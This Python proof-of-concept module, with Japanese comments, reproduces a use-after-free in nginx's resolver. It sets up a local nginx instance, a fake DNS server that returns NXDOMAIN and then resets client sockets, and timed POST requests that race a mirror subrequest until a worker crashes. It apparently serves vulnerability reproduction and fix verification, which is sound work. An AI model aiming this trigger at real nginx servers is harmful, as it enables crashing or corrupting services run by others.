#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-123634: nginx resolver UAF (mirror subrequest) 自己完結再現モジュール.

公開 API:
    run(binary: str, workdir: str, host: str = "127.0.0.1") -> dict

戻り値: {"cve","configured","trigger","effect","detail"}
effect: UAF | CRASH | TRIGGERED | ERROR | SKIP

概要:
  http に resolver を置き、location / で mirror /mirror; mirror_request_body off;
  proxy_pass http://$host:19000; とする。クライアントは POST を送り、ヘッダのみ
  先に送って本文を遅らせる。mirror サブリクエストが先に同じ名前の解決を開始し、
  後から main リクエストが同じ名前を解決待ちに加わる（待ちリストは LIFO なので
  main が先頭）。DNS が NXDOMAIN を返すと main の resolve handler が 502 を書くが、
  クライアントは DNS 応答直後に RST しているため書き込みが失敗し terminate される。
  main の cleanup が mirror の解決 ctx (まだ wait リスト内) を解放し、resolver の
  待ちリスト走査が解放済み ctx を使う (UAF)。1.31.9 では ctx を free_handler 経由で
  解放するよう修正されており、同じ経路を踏んでもクラッシュしない。
"""
import os
import re
import shutil
import signal
import socket
import struct
import subprocess
import threading
import time

CVE = "CVE-2026-123634"
HOST_DEFAULT = "127.0.0.1"
P_HTTP = 18445
P_DNS = 15353
P_BACKEND = 19000

CONF_TMPL = """\
worker_processes 1;
daemon on;
pid %(prefix)s/nginx.pid;
error_log %(prefix)s/logs/error.log debug;

events {
    worker_connections 64;
}

http {
    access_log off;
    client_body_temp_path %(prefix)s/tmp/client;
    proxy_temp_path %(prefix)s/tmp/proxy;

    resolver 127.0.0.1:%(dns_port)d ipv6=off valid=1s;

    server {
        listen 127.0.0.1:%(http_port)d;

        location / {
            mirror /mirror;
            mirror_request_body off;
            proxy_pass http://$host:%(backend_port)d;
        }

        location = /mirror {
            internal;
            proxy_pass http://$host:%(backend_port)d;
        }
    }
}
"""


class DNSResponder(threading.Thread):
    """15353/UDP で NXDOMAIN を返し、応答直後に登録されたクライアント socket を RST する。"""

    def __init__(self, host, port, delay=0.0):
        super().__init__(daemon=True)
        self.host = host
        self.port = port
        self.delay = delay
        self.sock = None
        self.running = True
        self.queries = 0
        self.pending = []
        self.lock = threading.Lock()

    def push(self, sock):
        with self.lock:
            self.pending.append(sock)

    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((self.host, self.port))
        s.settimeout(0.2)
        self.sock = s
        while self.running:
            try:
                q, addr = s.recvfrom(2048)
            except socket.timeout:
                continue
            except OSError:
                break
            self.queries += 1
            if self.delay:
                time.sleep(self.delay)
            try:
                s.sendto(self._nxdomain(q), addr)
            except OSError:
                pass
            sock = None
            with self.lock:
                if self.pending:
                    sock = self.pending.pop(0)
            if sock is not None:
                try:
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
                                    struct.pack("ii", 1, 0))
                    sock.close()
                except OSError:
                    pass
        try:
            s.close()
        except OSError:
            pass

    @staticmethod
    def _nxdomain(q):
        i = 12
        while i < len(q) and q[i] != 0:
            i += 1 + q[i]
        i += 1
        question = q[12:i + 4]
        return q[:2] + b"\x81\x83" + b"\x00\x01\x00\x00\x00\x00\x00\x00" + question

    def stop(self):
        self.running = False
        if self.sock is not None:
            try:
                self.sock.close()
            except OSError:
                pass
        with self.lock:
            for sock in self.pending:
                try:
                    sock.close()
                except OSError:
                    pass
            self.pending = []


class Backend(threading.Thread):
    """19000/TCP の単純な HTTP バックエンド (proxy_pass 先)。"""

    def __init__(self, host, port):
        super().__init__(daemon=True)
        self.host = host
        self.port = port
        self.sock = None
        self.running = True
        self.hits = 0

    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        for _attempt in range(40):
            try:
                s.bind((self.host, self.port))
                break
            except OSError:
                time.sleep(0.05)
        else:
            return
        s.listen(128)
        s.settimeout(0.2)
        self.sock = s
        while self.running:
            try:
                c, _ = s.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(target=self._handle, args=(c,), daemon=True).start()
        try:
            s.close()
        except OSError:
            pass

    def _handle(self, c):
        try:
            c.settimeout(2)
            data = b""
            while b"\r\n\r\n" not in data:
                d = c.recv(4096)
                if not d:
                    return
                data += d
            self.hits += 1
            c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nOK")
        except OSError:
            pass
        finally:
            try:
                c.close()
            except OSError:
                pass

    def stop(self):
        self.running = False
        if self.sock is not None:
            try:
                self.sock.close()
            except OSError:
                pass


def _ensure_cert(base):
    cert_dir = os.path.join(base, "certs")
    os.makedirs(cert_dir, exist_ok=True)
    cert = os.path.join(cert_dir, "cert.pem")
    key = os.path.join(cert_dir, "key.pem")
    if not (os.path.isfile(cert) and os.path.isfile(key)):
        subprocess.run(
            ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-days", "2",
             "-keyout", key, "-out", cert, "-subj", "/CN=localhost",
             "-addext", "subjectAltName=DNS:localhost,DNS:evil.test,IP:127.0.0.1"],
            check=True, capture_output=True)
    os.chmod(cert, 0o644)
    os.chmod(key, 0o644)
    return cert, key


def _prepare(base, prefix):
    for d in ("logs", "tmp/client", "tmp/proxy"):
        os.makedirs(os.path.join(prefix, d), exist_ok=True)
    _ensure_cert(base)
    conf = CONF_TMPL % dict(prefix=prefix, dns_port=P_DNS, http_port=P_HTTP,
                            backend_port=P_BACKEND)
    conf_path = os.path.join(prefix, "nginx.conf")
    with open(conf_path, "w") as f:
        f.write(conf)
    return conf_path


def _kill_by_cmdline(tag):
    for pd in os.listdir("/proc"):
        if not pd.isdigit():
            continue
        try:
            cmd = open("/proc/%s/cmdline" % pd, "rb").read().replace(b"\0", b" ").decode("utf-8", "replace")
        except OSError:
            continue
        if tag in cmd and "nginx" in cmd:
            try:
                os.kill(int(pd), signal.SIGKILL)
            except OSError:
                pass


def _start_nginx(binary, prefix, conf_path):
    proc = subprocess.run([binary, "-p", prefix + "/", "-c", conf_path],
                          capture_output=True, text=True, timeout=15)
    if proc.returncode != 0:
        raise RuntimeError((proc.stderr or proc.stdout).strip())
    deadline = time.time() + 5
    while time.time() < deadline:
        try:
            s = socket.create_connection((HOST_DEFAULT, P_HTTP), timeout=0.2)
            s.close()
            time.sleep(0.25)  # ポート確認用の接続スロットが解放されるのを待つ
            return
        except OSError:
            time.sleep(0.05)
    raise RuntimeError("listen 127.0.0.1:%d が開かない" % P_HTTP)


def _stop_nginx(prefix):
    pid = None
    try:
        pid = int(open(os.path.join(prefix, "nginx.pid")).read().strip())
    except Exception:
        pid = None
    if pid:
        try:
            os.kill(pid, signal.SIGTERM)
        except OSError:
            pass
        deadline = time.time() + 3
        while time.time() < deadline:
            try:
                os.kill(pid, 0)
            except ProcessLookupError:
                break
            time.sleep(0.05)
        try:
            os.kill(pid, signal.SIGKILL)
        except OSError:
            pass
    _kill_by_cmdline(prefix)


def _collect(prefix):
    path = os.path.join(prefix, "logs", "error.log")
    try:
        text = open(path, errors="ignore").read()
    except OSError:
        return [], [], [], []
    crashes, alerts, notes, hits = [], [], [], []
    for line in text.splitlines():
        if re.search(r"worker process \d+ exited on signal (\d+)", line) or "segmentation fault" in line:
            crashes.append(line.strip())
        elif "could not cancel" in line:
            # 1.31.8 は [alert]、1.31.9 は free_handler 導入で [debug]
            if "[alert]" in line:
                alerts.append(line.strip())
            else:
                notes.append(line.strip())
        elif "http upstream resolve:" in line:
            hits.append(line.strip())
    return crashes, alerts, notes, hits


def _send_request(i, body_delay):
    host = "u%d.test" % i
    s = socket.create_connection((HOST_DEFAULT, P_HTTP), timeout=2)
    s.sendall(("POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 8\r\n"
               "Connection: close\r\n\r\n" % host).encode())
    # ヘッダ処理後に mirror サブリクエストが同一名の解決を開始できるよう、
    # main の upstream init (本文受信後) を遅らせる
    time.sleep(body_delay)
    s.sendall(b"AAAAAAAA")
    return s


def run(binary, workdir, host="127.0.0.1"):
    """CVE-2026-123634 を再現する。"""
    del host  # 専有ポートは 127.0.0.1 固定
    base = os.path.abspath(os.path.join(workdir, "cve-2026-123634"))
    os.makedirs(base, exist_ok=True)
    prefix = os.path.join(base, "run")
    if os.path.isdir(prefix):
        shutil.rmtree(prefix)
    result = {
        "cve": CVE,
        "configured": False,
        "trigger": ("resolver 環境で mirror サブリクエストと main が同一名 (Host) を解決待ちにし、"
                    "DNS が NXDOMAIN を返した直後にクライアントが RST。main の 502 書き込み失敗 → "
                    "terminate → mirror の解決 ctx 解放 → resolver 待ちリスト走査で UAF。"),
        "effect": "ERROR",
        "detail": "",
    }
    dns = None
    backend = None
    try:
        conf_path = _prepare(base, prefix)
        test = subprocess.run([binary, "-t", "-p", prefix + "/", "-c", conf_path],
                              capture_output=True, text=True, timeout=15)
        if test.returncode != 0:
            result["effect"] = "SKIP"
            result["detail"] = "nginx -t 失敗: " + (test.stderr or test.stdout).strip()
            return result
        result["configured"] = True

        dns = DNSResponder(HOST_DEFAULT, P_DNS, delay=0.02)
        dns.start()
        backend = Backend(HOST_DEFAULT, P_BACKEND)
        backend.start()
        time.sleep(0.2)

        _start_nginx(binary, prefix, conf_path)

        total = 0
        for rnd in range(3):
            for i in range(10):
                try:
                    sock = _send_request(rnd * 100 + i, body_delay=0.002)
                    dns.push(sock)
                    total += 1
                except OSError:
                    pass
                time.sleep(0.006)
            time.sleep(0.15)
            crashes, _alerts, _notes, _hits = _collect(prefix)
            if crashes:
                break
        time.sleep(0.2)
        crashes, alerts, notes, hits = _collect(prefix)
        _stop_nginx(prefix)
        time.sleep(0.05)

        if crashes:
            result["effect"] = "CRASH"
        elif alerts:
            result["effect"] = "UAF"
        else:
            result["effect"] = "TRIGGERED"

        detail = [
            "prefix=%s" % prefix,
            "リクエスト送信数=%d / DNS クエリ数=%d / backend ヒット数=%d" % (total, dns.queries, backend.hits),
            "resolve 実行ログ数=%d" % len(hits),
        ]
        if crashes:
            detail.append("クラッシュ: " + crashes[0])
            detail.append("検出したワーカー異常終了: %d 件" % len(crashes))
        if alerts:
            detail.append("解放済み ctx の done() 検出 ([alert] could not cancel): " + alerts[0])
            detail.append("could not cancel 検出数: %d 件" % len(alerts))
        elif notes:
            detail.append("同一経路を実行 ([debug] could not cancel / 1.31.9 の free_handler 経由): " + notes[0])
            detail.append("could not cancel 検出数: %d 件 (alert ではなく debug)" % len(notes))
        else:
            detail.append("could not cancel は検出されなかった（レース不成立）")
        if result["effect"] == "UAF":
            detail.append("クラッシュは無いが、解放済み resolve ctx が待ちリスト走査で再利用された (UAF)")
        elif result["effect"] == "TRIGGERED":
            detail.append("修正版の可能性: 同一経路を実行したがクラッシュせず")
        result["detail"] = " / ".join(detail)
        return result
    except Exception as exc:  # noqa: BLE001
        result["effect"] = "ERROR"
        result["detail"] = "%s: %s" % (type(exc).__name__, exc)
        return result
    finally:
        try:
            _stop_nginx(prefix)
        except Exception:  # noqa: BLE001
            pass
        if dns is not None:
            dns.stop()
        if backend is not None:
            backend.stop()
        time.sleep(0.05)


if __name__ == "__main__":
    import json
    import sys
    b = sys.argv[1] if len(sys.argv) > 1 else "/app/data/sessions/conv-43/build/inst-vuln/sbin/nginx"
    w = sys.argv[2] if len(sys.argv) > 2 else "/app/data/sessions/conv-43/poc-run-B"
    print(json.dumps(run(b, w), ensure_ascii=False, indent=2))
